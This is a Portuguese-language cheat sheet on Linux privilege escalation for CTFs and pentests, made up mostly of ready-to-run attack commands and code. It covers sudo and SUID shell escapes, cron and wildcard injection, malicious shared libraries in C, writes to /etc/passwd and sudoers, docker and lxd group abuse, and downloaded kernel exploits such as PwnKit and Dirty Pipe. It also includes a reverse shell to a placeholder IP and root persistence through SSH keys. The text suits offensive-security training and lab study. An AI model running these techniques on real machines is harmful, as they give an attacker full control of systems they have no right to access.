	# 🐧 Linux Privilege Escalation — Guia Completo

> **O que é:** Após conseguir acesso inicial a uma máquina (shell como usuário comum), o próximo objetivo é escalar privilégios para **root** (UID 0). Essa é frequentemente a parte mais desafiadora de um CTF ou pentest.

---

## 🧠 Mentalidade e Metodologia

A escalação de privilégio em Linux se resume a **uma pergunta**: *"O que esse usuário pode fazer que o root não deveria ter permitido?"*

**Checklist mental — sempre seguir nesta ordem:**

1. **Quem eu sou?** → `id`, `whoami`, `groups`
2. **O que posso rodar como root?** → `sudo -l`
3. **Tem binário SUID estranho?** → `find / -perm -u=s`
4. **Tem cronjob rodando como root?** → `/etc/crontab`, `crontab -l`
5. **Tem arquivo sensível legível?** → `.bash_history`, `.env`, senhas em config
6. **Tem capabilities especiais?** → `getcap -r / 2>/dev/null`
7. **Estou em algum grupo especial?** → `docker`, `lxd`, `disk`, `adm`
8. **Tem compartilhamento NFS aberto?** → `/etc/exports` com `no_root_squash`
9. **A versão do kernel é antiga?** → `uname -a` → buscar exploit público

> **Dica de ouro:** Rode o **LinPEAS** (`linpeas.sh`) assim que entrar na máquina. Ele automatiza 90% dessa enumeração e destaca em **vermelho/amarelo** os vetores mais promissores.

---

## 1️⃣ Sudo — O Vetor Mais Comum

O comando `sudo -l` é **sempre** a primeira coisa a verificar. Ele mostra o que o usuário pode executar como root.

**Cenários possíveis:**

| Saída do `sudo -l` | O que fazer |
|---|---|
| `(ALL) NOPASSWD: ALL` | Você já é root: `sudo su` |
| `(ALL) NOPASSWD: /usr/bin/vim` | Pesquisar no GTFOBins |
| `(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py` | Verificar se pode editar o script |
| `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/bash` |
| `Sem nada` | Passe para a próxima técnica |

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — É um banco de dados de binários Unix que podem ser abusados para escapar de shells restritas, escalar privilégios, transferir arquivos, etc.

**Exemplos comuns:**
```
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/shadow    → Dentro do less, digite: !/bin/bash
sudo env /bin/bash
sudo nmap --interactive  → !sh (versões antigas)
```

> **⚠️ Atenção com scripts personalizados:** Se o `sudo -l` mostra que você pode rodar um script específico como root (ex: `sudo /usr/bin/python3 /opt/app/script.py`), **analise o código desse script!** Pode ter falhas como:
> - `subprocess.run()` sem caminho absoluto → **PATH Hijacking**
> - Import de módulo Python que você pode substituir → **Library Hijacking**
> - O script executa arquivos de um diretório que você controla → **Como na máquina Retro.hc!**

---

## 2️⃣ SUID — Binários que Rodam como Dono

Quando um binário tem o bit **SUID** ativo, ele executa com as permissões do **dono do arquivo** (geralmente root), independente de quem o executa.

**Como encontrar:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Binários SUID comuns que NÃO são exploráveis:** `passwd`, `su`, `ping`, `mount`, `umount` → Já são esperados.

**Binários SUID que SÃO exploráveis (verificar no GTFOBins):**
- `find`, `vim`, `bash`, `nmap`, `python`, `php`, `perl`, `ruby`, `env`, `cp`, `mv`
- Qualquer binário **customizado** ou que você **não reconheça** → **INVESTIGAR!**

**Exemplo de exploração:**
```bash
# Se /usr/bin/find tem SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Se /usr/bin/python3 tem SUID:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Se bash tem SUID (ou você criou um com chmod +s):
bash -p    # A flag -p preserva o EUID de root
```

> **Conceito:** A flag `-p` do bash é crucial! Sem ela, o bash **descarta automaticamente** os privilégios elevados. Sempre use `bash -p` quando explorar binários SUID.

---

## 3️⃣ Cronjobs — Tarefas Agendadas Rodando como Root

Cronjobs são tarefas que rodam periodicamente. Se um cronjob roda como **root** e executa um script/arquivo que você pode **modificar**, você ganha root.

**Onde verificar:**
```bash
cat /etc/crontab                    # Crontab do sistema
ls -la /etc/cron.d/                 # Pasta de cron extras
ls -la /etc/cron.daily/             # Tarefas diárias
ls -la /etc/cron.hourly/            # Tarefas por hora
crontab -l                          # Crontab do usuário atual
cat /var/spool/cron/crontabs/*      # Crontabs de outros usuários (se tiver permissão)
```

**O que procurar:**
1. **Script com permissão de escrita para você** → Modificar o script com payload
2. **Script em diretório que você controla** → Deletar/recriar o script
3. **Wildcard `*` no comando** → Wildcard injection (tar, chmod, chown)
4. **Binário sem caminho absoluto** → PATH Hijacking

**Exemplo — Modificar script de cronjob:**
```bash
# Se /opt/backup.sh roda como root no cron e você pode escrever nele:
echo '#!/bin/bash' > /opt/backup.sh
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Espere o cron executar, depois:
bash -p
```

**Exemplo — Controle da pasta pai (como na Retro.hc!):**
```bash
# Se /home/user/roms/ pertence ao root mas /home/user/ pertence a você:
rm -rf /home/user/roms       # Deletar a pasta do root
mkdir /home/user/roms         # Recriar como SUA
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /home/user/roms/exploit.smc
chmod +x /home/user/roms/exploit.smc
# Quando o cronjob do root executar o arquivo, o bash ganha SUID!
```

> **Ferramenta útil:** Use `pspy` (https://github.com/DominicBreuker/pspy) para monitorar **processos em tempo real** sem precisar de root. Ele mostra cronjobs e processos que estão executando, mesmo os que não aparecem no crontab!

---

## 4️⃣ Arquivos Sensíveis — Senhas em Claro

Nunca subestime o poder de **ler arquivos**. Muitas vezes a senha do root está literalmente escrita em algum arquivo.

**O que procurar:**
```bash
# Histórico de comandos (geralmente tem senhas digitadas por acidente)
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null

# Arquivos de configuração
cat .env
cat config.php
cat wp-config.php
cat /var/www/html/.env
cat /etc/shadow               # Se tiver permissão de leitura

# Procurar "password" em arquivos de config
grep -rnwi 'password' /var/www/ 2>/dev/null
grep -rnwi 'password' /opt/ 2>/dev/null
grep -rnwi 'password' /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.cnf" -o -name "*.ini" 2>/dev/null | xargs grep -i password 2>/dev/null

# Chaves SSH
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

> **Dica:** Após encontrar uma senha, sempre tente:
> 1. `su root` com essa senha
> 2. `su <outro_usuario>` com essa senha
> 3. Login SSH com essa senha
> 4. Pessoas **reutilizam senhas** — a senha do banco de dados pode ser a do root!

---

## 5️⃣ PATH Hijacking — Sequestro de Binários

Quando um script roda como root e chama um comando **sem caminho absoluto** (ex: `cat` em vez de `/bin/cat`), você pode criar um arquivo malicioso com o mesmo nome e manipular a variável `$PATH` para que o sistema encontre o seu arquivo primeiro.

**Como identificar:**
- Analisar scripts de cronjob ou scripts que rodam com sudo
- Procurar por chamadas como `system("cat arquivo")` ou `subprocess.run(["cat", arquivo])`

**Como explorar:**
```bash
# 1. Criar payload com o nome do binário
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat

# 2. Colocar /tmp no início do PATH
export PATH=/tmp:$PATH

# 3. Executar o script vulnerável
./script_vulneravel    # Quando ele chamar "cat", vai executar o SEU /tmp/cat
```

---

## 6️⃣ Capabilities — Permissões Granulares

Linux Capabilities são permissões mais finas que o SUID. Um binário pode ter capabilities específicas que permitem ações de root.

**Como encontrar:**
```bash
getcap -r / 2>/dev/null
# Exemplo de saída perigosa:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl      = cap_setuid+ep
# /usr/bin/vim.basic = cap_dac_read_search+ep
```

**Capabilities perigosas:**
| Capability | Perigo |
|---|---|
| `cap_setuid+ep` | Muda UID para 0 → root direto |
| `cap_dac_override+ep` | Ignora permissões de escrita → sobrescrever qualquer arquivo |
| `cap_dac_read_search+ep` | Ignora permissões de leitura → ler `/etc/shadow` |
| `cap_net_raw+ep` | Sniffing de rede |
| `cap_sys_admin+ep` | Quase equivalente a root completo |
| `cap_sys_ptrace+ep` | Injetar código em qualquer processo |

**Exploração por binário:**
```bash
# Python com cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl com cap_setuid:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby com cap_setuid:
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js com cap_setuid:
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# tar com cap_dac_read_search (ler arquivos protegidos):
tar xf /etc/shadow --to-command='cat > /tmp/shadow'
cat /tmp/shadow

# vim com cap_dac_read_search:
vim /etc/shadow    # lê normalmente mesmo sem permissão

# openssl com cap_dac_read_search:
openssl enc -in /etc/shadow | cat

# Python com cap_dac_override (sobrescrever /etc/passwd):
python3 -c "
import os
with open('/etc/passwd', 'a') as f:
    f.write('hacker::0:0:root:/root:/bin/bash\n')
"
su hacker    # sem senha, UID 0
```

---

## 7️⃣ Grupos Especiais

Estar em certos grupos permite escalar para root diretamente. Verifique com `id` e `groups`.

**Grupo `docker`:**
```bash
# Montar o filesystem inteiro do host dentro do container:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Agora você é root DENTRO do container, mas /mnt é o / do HOST

# Alternativa — dar SUID ao bash do host:
docker run -v /:/mnt --rm -it alpine chmod u+s /mnt/bin/bash
bash -p    # no host

# Alternativa — adicionar seu usuário ao /etc/sudoers do host:
docker run -v /:/mnt --rm -it alpine sh -c \
  "echo 'seuuser ALL=(ALL) NOPASSWD: ALL' >> /mnt/etc/sudoers"
```

**Grupo `lxd`/`lxc`:**
```bash
# Método mais simples (sem precisar de imagem local):
lxc init ubuntu:18.04 privesc -c security.privileged=true 2>/dev/null || \
lxc image import ./alpine.tar.gz --alias alpine && \
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# /mnt/root é o / do host com acesso root total
chmod +s /mnt/root/bin/bash
exit
bash -p    # no host → root!
```

**Grupo `disk`:**
```bash
# Acesso de leitura/escrita direto no disco (bypassa filesystem permissions)
debugfs /dev/sda1
# Dentro do debugfs:
cat /etc/shadow
cat /root/.ssh/id_rsa
# Para escrita:
echo 'hacker::0:0:root:/root:/bin/bash' | debugfs -w -R 'write /dev/stdin /etc/passwd' /dev/sda1
```

**Grupo `shadow`:**
```bash
# Pode ler /etc/shadow diretamente → crackear hashes
cat /etc/shadow
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-512
hashcat -m 500  hash.txt /usr/share/wordlists/rockyou.txt   # MD5
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Grupo `adm`:**
```bash
# Pode ler todos os logs do sistema → buscar senhas expostas
grep -i 'password\|passwd\|secret\|token' /var/log/auth.log 2>/dev/null
grep -i 'password\|passwd' /var/log/syslog 2>/dev/null
cat /var/log/apache2/access.log | grep -i 'pass'
# Logs de autenticação sudo mostram comandos executados com senha:
grep 'sudo' /var/log/auth.log | grep 'COMMAND'
```

**Grupo `video`:**
```bash
# Pode ler o framebuffer (capturar tela do servidor)
cp /dev/fb0 /tmp/screen.raw
# Converter para PNG na sua máquina com ffmpeg ou GIMP
```

**Grupo `staff`:**
```bash
# Pode escrever em /usr/local/ → sobrescrever binários do PATH
ls -la /usr/local/bin/
# Se algum binário no PATH do root estiver aqui e você puder escrever:
echo '#!/bin/bash\nchmod +s /bin/bash' > /usr/local/bin/nome_do_binario
chmod +x /usr/local/bin/nome_do_binario
```

---

## 8️⃣ Kernel Exploits — Último Recurso

Se nada funcionar, verifique se o kernel é vulnerável a exploits conhecidos.

**Como verificar versão:**
```bash
uname -a                           # Versão completa do kernel
cat /etc/os-release                # Distribuição e versão
cat /proc/version                  # Info do kernel
uname -r                           # Só a versão (ex: 5.4.0-42-generic)
```

**Exploits famosos com payloads reais:**

| Alvo | Exploit | CVE | Versão vulnerável |
|---|---|---|---|
| Linux kernel | Dirty COW | CVE-2016-5195 | < 4.8.3 |
| Linux kernel | Dirty Pipe | CVE-2022-0847 | 5.8 – 5.16.11 |
| Polkit pkexec | PwnKit | CVE-2021-4034 | pkexec < 0.120 |
| Sudo | Baron Samedit | CVE-2021-3156 | < 1.9.5p2 |
| overlayfs | GameOver(lay) | CVE-2023-2640 | Ubuntu 22.04 / 23.04 |
| nf_tables | netfilter RCE | CVE-2022-32250 | < 5.18.1 |

**Dirty COW (CVE-2016-5195):**
```bash
# Verificar se é vulnerável:
uname -r    # kernel < 4.8.3

# Baixar e compilar:
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <nova_senha>
# Cria usuário 'firefart' com UID 0
su firefart    # usa a nova senha que você definiu
```

**Dirty Pipe (CVE-2022-0847):**
```bash
# Verificar se é vulnerável:
uname -r    # kernel entre 5.8 e 5.16.11

# Compilar exploit:
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit1
./exploit1    # Modifica /etc/passwd para adicionar root
# ou:
gcc exploit-2.c -o exploit2
./exploit2 /usr/bin/sudo    # Injeta shellcode em binário SUID
```

**PwnKit — pkexec (CVE-2021-4034):**
```bash
# Verificar versão do pkexec:
pkexec --version    # < 0.120 = vulnerável

# Exploit compilável:
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034    # → root shell!

# Versão em uma linha (sem git):
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

**Sudo Baron Samedit (CVE-2021-3156):**
```bash
# Verificar versão do sudo:
sudo --version    # < 1.9.5p2

# Teste rápido de vulnerabilidade (não requer root):
sudoedit -s '\' $(python3 -c 'print("A"*65536)')
# Se der Segmentation fault → vulnerável!

# Exploit:
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich    # Lista targets disponíveis
./sudo-hax-me-a-sandwich 0  # Escolhe o target correto para a distro
```

**GameOver(lay) Ubuntu (CVE-2023-2640 + CVE-2023-32629):**
```bash
# Só afeta Ubuntu com kernel 5.15 / 6.2 (22.04, 23.04)
uname -r && cat /etc/os-release | grep VERSION

# Exploit em uma linha:
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;
u/python3 -c 'import os;os.setuid(0);os.system(\"id\";os.system(\"/bin/bash\"))'" && true
```

**Buscar exploits com ferramentas:**
```bash
# searchsploit (offline):
searchsploit linux kernel $(uname -r | cut -d- -f1)
searchsploit linux privilege escalation local

# linux-exploit-suggester (online/offline):
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh

# Compilar na máquina alvo (se tiver gcc):
gcc exploit.c -o exploit && chmod +x exploit && ./exploit

# Compilar na sua máquina para a arquitetura do alvo:
uname -m    # ver arquitetura (x86_64, i686, aarch64...)
gcc -m32 exploit.c -o exploit32    # cross-compile 32-bit
```

> **⚠️ Kernel exploits são ÚLTIMO RECURSO** — podem travar ou crashar a máquina. Em CTFs a solução quase sempre é via outra técnica.

---

## 9️⃣ NFS — Root Squashing Desabilitado

Se o servidor exporta diretórios NFS com `no_root_squash`, qualquer arquivo criado como root na sua máquina será root no alvo.

**Como verificar:**
```bash
cat /etc/exports
# Procurar por: no_root_squash
showmount -e <IP_ALVO>
```

**Como explorar (da sua máquina atacante):**
```bash
mkdir /tmp/nfs
sudo mount -t nfs <IP_ALVO>:<SHARE> /tmp/nfs
sudo cp /bin/bash /tmp/nfs/rootbash
sudo chmod +s /tmp/nfs/rootbash

# Na máquina alvo:
./rootbash -p
```

---

## 🔟 Library/Module Hijacking (Python, Node.js)

Quando um script roda como root e **importa módulos**, se você puder escrever no diretório de módulos ou no mesmo diretório do script, pode criar um módulo malicioso.

**Python — Hijacking de import:**
```bash
# Se o script /opt/app.py executa como root e faz "import utils":
# Verificar o PYTHONPATH e os diretórios de busca de módulos
python3 -c "import sys; print(sys.path)"

# Criar módulo malicioso no diretório do script (se tiver escrita):
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/utils.py

# Quando o script executar, ele importa O SEU utils.py
```

---

## 1️⃣1️⃣ Wildcard Injection — Abuso de `*` em Cronjobs

Quando um comando de cronjob usa `*` (wildcard), é possível criar arquivos com nomes que o shell interpreta como **flags do comando**, injetando opções arbitrárias.

**Alvo clássico — `tar`:**
```bash
# Cronjob típico vulnerável:
# * * * * * root tar -czf /backup/backup.tgz /home/*

# O tar aceita flags como nomes de arquivo via --checkpoint-action
# Criando os "arquivos" maliciosos no diretório que o tar varre:
echo 'chmod +s /bin/bash' > /home/user/shell.sh
chmod +x /home/user/shell.sh
touch '/home/user/--checkpoint=1'
touch '/home/user/--checkpoint-action=exec=sh shell.sh'

# Quando o cron rodar, o tar vai expandir o * e interpretar os nomes como flags:
# tar ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# Resultado: shell.sh executa como root → bash ganha SUID
bash -p
```

**Alvo — `chown` / `chmod`:**
```bash
# Cronjob: chown root:root /tmp/uploads/*
# Criar arquivo com nome de referência de arquivo:
touch '/tmp/uploads/--reference=/tmp/myfile'
# chown vai usar o dono de /tmp/myfile como referência ao invés de root:root
```

**Verificar rapidamente se tem wildcard em cronjobs:**
```bash
cat /etc/crontab | grep '\*'
ls -la /etc/cron* 2>/dev/null | grep '\*'
```

---

## 1️⃣2️⃣ Sudo — Misconfigs Avançadas

Além do básico `sudo -l`, existem misconfigs mais sutis que também levam a root.

### LD_PRELOAD via sudo (SETENV)

Se o `sudo -l` mostra `env_keep+=LD_PRELOAD` ou `SETENV`, você pode carregar uma shared library maliciosa antes de qualquer binário rodado com sudo:

```bash
# Verificar se LD_PRELOAD está disponível:
sudo -l
# Se aparecer: env_keep+=LD_PRELOAD  ou  SETENV

# 1. Criar a shared library maliciosa:
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# 2. Executar qualquer binário que você pode rodar com sudo:
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
# → Spawna shell root antes mesmo do find executar
```

### sudo -u#-1 (CVE-2019-14287)

Versões do sudo < 1.8.28 permitem rodar como root mesmo sendo explicitamente bloqueado:

```bash
# sudo -l mostra algo como:
# (ALL, !root) NOPASSWD: /bin/bash
# Isso deveria bloquear root, mas:

sudo -u#-1 /bin/bash    # -1 é interpretado como UID 4294967295 → root!
sudo -u#4294967295 /bin/bash
```

### sudo com variáveis de ambiente perigosas

```bash
# Se sudo preserva PYTHONPATH:
export PYTHONPATH=/tmp
echo 'import os; os.system("/bin/bash -p")' > /tmp/site.py
sudo python3 -c 'import site'

# Se sudo preserva PERL5LIB:
export PERL5LIB=/tmp
echo 'system("/bin/bash -p");' > /tmp/POSIX.pm
sudo perl -e 'use POSIX;'
```

### Sudo token reutilização (sem senha por 15min)

```bash
# Se outro usuário usou sudo recentemente, o token pode ainda estar válido:
# Explorar via /proc para reutilizar o token Kerberos/sudo
# Verificar se sudo está em cache:
sudo -n true 2>/dev/null && echo "sudo sem senha disponível agora!"
```

---

## 1️⃣3️⃣ Arquivos Graváveis Críticos

Ter permissão de escrita em certos arquivos é equivalente a ter root.

### /etc/passwd — Adicionar usuário root

O arquivo `/etc/passwd` aceita senhas diretamente no segundo campo (formato legado). Se for gravável:

```bash
# Verificar se é gravável:
ls -la /etc/passwd

# Gerar hash de senha (ex: senha "hacked"):
openssl passwd -1 -salt xyz hacked
# Saída: $1$xyz$HASH_AQUI

# Adicionar linha com UID 0 (root):
echo 'hacker:$1$xyz$HASH_AQUI:0:0:root:/root:/bin/bash' >> /etc/passwd

# Logar como o novo usuário root:
su hacker   # senha: hacked
```

### /etc/sudoers — Conceder sudo irrestrito

```bash
# Verificar se é gravável:
ls -la /etc/sudoers
ls -la /etc/sudoers.d/

# Adicionar regra para seu usuário:
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# ou em sudoers.d:
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/backdoor

# Depois:
sudo su
```

### Scripts de inicialização e serviços graváveis

```bash
# Procurar scripts rodados pelo root que você pode editar:
find / -writable -type f 2>/dev/null | grep -E '\.(sh|py|rb|pl)$' | grep -v proc
find /etc/init.d/ -writable 2>/dev/null
find /etc/systemd/ -writable 2>/dev/null

# Procurar binários em PATH do sistema que você pode sobrescrever:
find /usr/local/bin /usr/local/sbin -writable 2>/dev/null

# Verificar diretórios graváveis no PATH do root:
echo $PATH | tr ':' '\n' | xargs ls -ld 2>/dev/null | grep -v root
```

### /etc/cron.d / scripts de cron graváveis

```bash
# Criar novo cronjob como root se o diretório for gravável:
echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/privesc
# Aguardar 1 minuto, depois:
bash -p
```

---

## 1️⃣4️⃣ Shared Library Hijacking (LD_LIBRARY_PATH / RPATH)

Quando um binário carrega shared libraries, é possível interceptar essa carga colocando uma lib maliciosa no caminho de busca.

**Identificar bibliotecas carregadas por um binário SUID:**
```bash
# Ver quais libs um binário usa:
ldd /usr/bin/suid_binary

# Ver ordem de busca de libs:
ldd /usr/bin/suid_binary 2>/dev/null | grep "not found"
# "not found" = lib que o binário tenta carregar mas não existe → você pode criar!
```

**Explorar lib ausente:**
```bash
# Se ldd mostra: libmissing.so.1 => not found

# Descobrir onde o binário busca libs:
readelf -d /usr/bin/suid_binary | grep -E 'RPATH|RUNPATH'
# ou verificar /etc/ld.so.conf e diretórios padrão

# Se você puder escrever em algum diretório do RPATH:
cat > /tmp/libmissing.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /caminho/do/rpath/libmissing.so.1 /tmp/libmissing.c

# Executar o binário SUID vulnerável:
/usr/bin/suid_binary
# → inject() roda automaticamente antes do main() → root!
```

---

## 1️⃣5️⃣ Escape de Shell Restrita (rbash / lshell)

Algumas contas têm uma shell restrita que bloqueia comandos, redirecionamentos e navegação de diretório. O objetivo é escapar para uma shell normal.

**Identificar shell restrita:**
```bash
echo $SHELL         # /bin/rbash ou /usr/bin/lshell
echo $PATH          # PATH limitado
cd /tmp             # rbash: can't cd
ls /usr/bin         # binários disponíveis listados
```

**Técnicas de escape:**
```bash
# Via editor de texto que permite shell:
vim → :!/bin/bash
vim → :set shell=/bin/bash → :shell
nano → Ctrl+T → /bin/bash

# Via linguagens de script disponíveis:
python3 -c 'import os; os.system("/bin/bash")'  
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
awk 'BEGIN {system("/bin/bash")}'
find . -exec /bin/bash \; -quit

# Via SSH — forçar shell diferente no login:
ssh user@alvo -t "bash --noprofile"
ssh user@alvo -t "/bin/bash"

# Via SSH com comandos pré-execução:
ssh user@alvo "bash --noprofile"

# Copiar bash para local acessível:
cp /bin/bash /tmp/bash
/tmp/bash -p

# Via tar (se disponível):
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Via variável de ambiente PATH:
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Via scripts Python que invocam subprocesso:
# Se algum script .py está disponível para execução:
echo 'import subprocess; subprocess.call(["/bin/bash"])' >> /tmp/x.py
python3 /tmp/x.py
```

**Após escapar — melhorar a shell:**
```bash
# Shell completa com PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# Ctrl+Z → stty raw -echo; fg
```

---

## 1️⃣6️⃣ Sudo Script Hijacking — Substituição de Script

> **Quando usar:** `sudo -l` mostra que você pode rodar um script específico como root (ex: `NOPASSWD: /usr/bin/python3 /opt/app/script.py`), e o arquivo do script **ou o diretório** onde ele está tem permissão de escrita para o seu usuário.

```bash
# 1. Identificar a regra de sudo
sudo -l
# Exemplo de saída: (ALL) NOPASSWD: /usr/bin/python3 /opt/app/script.py

# 2. Verificar permissões de escrita no arquivo/diretório
ls -la /opt/app/script.py
ls -la /opt/app/

# 3. Fazer backup (boa prática em Red Team)
mv /opt/app/script.py /opt/app/script.py.bak

# 4. Substituir pelo payload malicioso
# Opção A: Criar binário bash SUID (acesso root persistente sem senha)
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' > /opt/app/script.py

# Opção B: Reverse Shell direto
echo 'import os; os.system("bash -i >& /dev/tcp/SEU_IP/4444 0>&1")' > /opt/app/script.py

# Opção C: Adicionar usuário root no sistema
echo 'import os; os.system("echo \"hacker:x:0:0:root:/root:/bin/bash\" >> /etc/passwd")' > /opt/app/script.py

# 5. Disparar via Sudo (exatamente como a regra especifica)
sudo /usr/bin/python3 /opt/app/script.py
```

> **Sudo Pathing:** O sudo é literal — se a regra diz `/opt/app/script.py`, o comando deve ser executado com esse caminho exato, caso contrário o sudo vai negar.

**Variante — diretório gravável (a regra aponta para um script em pasta que você controla):**
```bash
# Se /opt/app/ pertence a você mas o script pertence ao root:
rm /opt/app/script.py
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/app/script.py
sudo /usr/bin/python3 /opt/app/script.py
bash -p
```

---

## 1️⃣7️⃣ Exploração do Binário SUID Bash (`bash -p`)

> Após criar um binário bash com bit SUID — seja via Script Hijacking, Cronjob, NFS ou qualquer outro método.

```bash
# Executar o bash SUID preservando os privilégios do dono (root)
/tmp/rootbash -p

# Verificar se escalou com sucesso
whoami      # deve retornar: root
id          # uid=0(root) gid=1000(user) euid=0(root)

# Ler flags
cat /root/root.txt
cat /etc/shadow

# Manter acesso — adicionar chave SSH ao root
mkdir -p /root/.ssh
echo "SUA_CHAVE_PUBLICA" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

> **Por que funciona:** A flag `-p` instrui o bash a **não descartar** os privilégios do EUID (Effective UID). Sem `-p`, o bash detecta que está rodando com EUID diferente do RUID e descarta os privilégios por segurança.

**Criar um bash SUID de forma manual:**
```bash
# Método 1: via cp + chmod (precisa ser root ou ter sudo)
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# Método 2: dar SUID ao bash original (via cronjob/NFS/script de root)
chmod u+s /bin/bash
# Depois, de qualquer usuário:
bash -p
```

---

## 1️⃣8️⃣ Pivot de Usuário e Movimentação Horizontal

Após encontrar credenciais, sempre tente pivotar para outros usuários antes de tentar técnicas mais complexas.

```bash
# Verificar usuários com shell válida no sistema
cat /etc/passwd | grep -E '/bin/bash|/bin/sh|/bin/zsh|/bin/fish'
cat /etc/passwd | grep -Ev 'nologin|false|sync|halt|shutdown'

# Trocar para usuário específico
su usuario
su - usuario    # Carrega ambiente completo do usuário

# Trocar para root (se tiver a senha)
su root
su -            # Equivalente com ambiente limpo de root

# Verificar se conseguiu mudar
id && whoami

# Buscar senhas em claro para usar no su:
cat ~/.bash_history                         # Histórico do usuário atual
cat /home/*/.bash_history 2>/dev/null       # Histórico de outros usuários
grep -rni 'password\|passwd\|pass\|secret\|token\|key' /home/ 2>/dev/null
grep -rni 'password\|passwd' /var/www/ 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat /opt/*.conf 2>/dev/null
cat /opt/*.py 2>/dev/null | grep -i pass

# Testar a mesma senha em todos os usuários (password spraying local):
# Senha encontrada: "Sup3rM@n.2"
su root          # tente
su www-data      # tente
su outro_user    # tente
ssh root@localhost    # tente via SSH também
```

> **Dica crítica:** Pessoas **reutilizam senhas**. A senha do banco de dados MySQL que você encontrou no `.env` pode ser a senha do root do sistema. Sempre teste.

---

## 🔄 Resumo — Fluxo de Privilege Escalation

```
Acesso Inicial (shell básica)
          │
          ├─→ Shell restrita?      → Escapar (vim, python, ssh -t)
          ├─→ sudo -l              → GTFOBins / LD_PRELOAD / env vars
          ├─→ find SUID            → GTFOBins / bash -p
          ├─→ ldd SUID binary      → Shared Library Hijacking
          ├─→ cat /etc/crontab     → Modificar script / Wildcard injection
          ├─→ Ler .bash_history    → Senhas em claro → su root
          ├─→ Ler .env / config    → Senhas de DB → testar com su
          ├─→ getcap               → cap_setuid / cap_dac_override
          ├─→ id (groups)          → docker / lxd / disk / shadow
          ├─→ ls -la /etc/passwd   → Gravável? → Adicionar root
          ├─→ find -writable       → Sudoers / Scripts init
          ├─→ cat /etc/exports     → NFS no_root_squash
          └─→ uname -r             → Dirty Pipe / PwnKit / Baron Samedit
                  │
                  ▼
             ROOT! 🎉
```

---

## 🛠️ Ferramentas de Enumeração Automática

| Ferramenta | Função |
|---|---|
| **LinPEAS** | Enumeração completa — principal ferramenta de privesc |
| **LinEnum** | Script bash clássico de enumeração |
| **pspy** | Monitora processos/cronjobs em tempo real sem precisar de root |
| **linux-exploit-suggester** | Sugere kernel exploits baseado na versão do sistema |

---

## 🔍 LinPEAS — Enumeração Completa de Privilege Escalation

> **O que é:** O **Linux Privilege Escalation Awesome Script** é a ferramenta mais completa para enumeração automática de vetores de escalação de privilégio. Ele verifica **centenas de pontos** e destaca os resultados em cores:
